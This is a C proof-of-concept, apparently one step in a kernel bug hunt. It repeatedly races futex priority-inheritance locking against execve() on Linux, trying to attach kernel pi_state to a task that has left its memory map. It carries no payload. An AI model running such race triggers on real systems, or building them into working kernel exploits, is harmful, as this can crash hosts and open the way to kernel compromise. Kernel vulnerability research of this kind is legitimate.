/*
 * l82_futex_pi_window.c - phase-swept single-shot version of the PI/exec race.
 *
 * l79/l80 let the waiter hammer TRYLOCK from the moment the owner took the lock,
 * so the pi_state was created *before* exec ever started and the one interesting
 * window was never sampled.  Here each attempt uses a single attach attempt whose
 * delay relative to execve() is randomised, which sweeps the window:
 *
 *   owner : LOCK_PI -> ready=1 -> execve()            (window is inside exec)
 *   waiter: ready -> usleep(d) -> TRYLOCK_PI once     (pi_state creation lands in the window)
 *
 * If the attach happens while the exec'ing task is between "cleanup done, state
 * back to OK" and "mm swapped", the pi_state is attached to a task that already
 * left that mm.  Nothing is written to the device.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/futex.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define STACK_SZ (64 * 1024)
#define MAX_WAIT_NS 400000L      /* sweep 0..400us */

static uint32_t g_word;
static volatile int g_ready;
static const char *g_self;

static long now_ns(void)
{
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return t.tv_sec * 1000000000L + t.tv_nsec;
}

static int fp(uint32_t *u, int op)
{
    return (int)syscall(SYS_futex, u, op | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
}

static void pin(int cpu)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu % 8, &s);
    sched_setaffinity(0, sizeof s, &s);
}

static int w_fn(void *arg)
{
    unsigned long delay = (unsigned long)arg;
    pin(3);
    while (!g_ready) { }
    if (delay) {
        long until = now_ns() + (long)delay;
        while (now_ns() < until) { }
    }
    int rc = fp(&g_word, FUTEX_TRYLOCK_PI);
    (void)rc;
    _exit(0);
}

static int o_fn(void *arg)
{
    (void)arg;
    pin(2);
    fp(&g_word, FUTEX_LOCK_PI);
    g_ready = 1;
    char *av[] = { (char *)g_self, (char *)"--exec-side", NULL };
    execv(g_self, av);
    _exit(3);
}

int main(int argc, char **argv)
{
    if (argc > 1 && !strcmp(argv[1], "--exec-side"))
        _exit(0);

    int iters = argc > 1 ? atoi(argv[1]) : 20000;
    char selfbuf[256];
    ssize_t n = readlink("/proc/self/exe", selfbuf, sizeof selfbuf - 1);
    if (n <= 0) return 1;
    selfbuf[n] = 0;
    g_self = selfbuf;

    srand((unsigned)now_ns());
    printf("=== l82 PI/exec window sweep (uid=%d, iters=%d) ===\n", (int)getuid(), iters);
    fflush(stdout);

    long t0 = now_ns();
    int done = 0;

    for (int it = 0; it < iters; it++) {
        pid_t h = fork();
        if (h == 0) {
            g_word = 0;
            g_ready = 0;
            void *so = mmap(NULL, STACK_SZ, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
            void *sw = mmap(NULL, STACK_SZ, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
            if (so == MAP_FAILED || sw == MAP_FAILED) _exit(4);

            unsigned long delay = (unsigned long)(rand() % MAX_WAIT_NS);
            pid_t w = clone(w_fn, (char *)sw + STACK_SZ, CLONE_VM | SIGCHLD, (void *)delay);
            pid_t o = clone(o_fn, (char *)so + STACK_SZ, CLONE_VM | SIGCHLD, NULL);
            if (w < 0 || o < 0) _exit(5);

            int st;
            waitpid(o, &st, 0);
            waitpid(w, &st, 0);
            _exit(0);
        }
        if (h < 0) break;
        int st = 0;
        waitpid(h, &st, 0);
        done++;
        if ((it & 0x3ff) == 0 && it) {
            printf("iter=%d elapsed=%.1fs (%.0f/s)\n", it, (now_ns() - t0) / 1e9,
                   it / ((now_ns() - t0) / 1e9));
            fflush(stdout);
        }
    }

    printf("done: %d iterations in %.1fs, no crash\n", done, (now_ns() - t0) / 1e9);
    return 0;
}
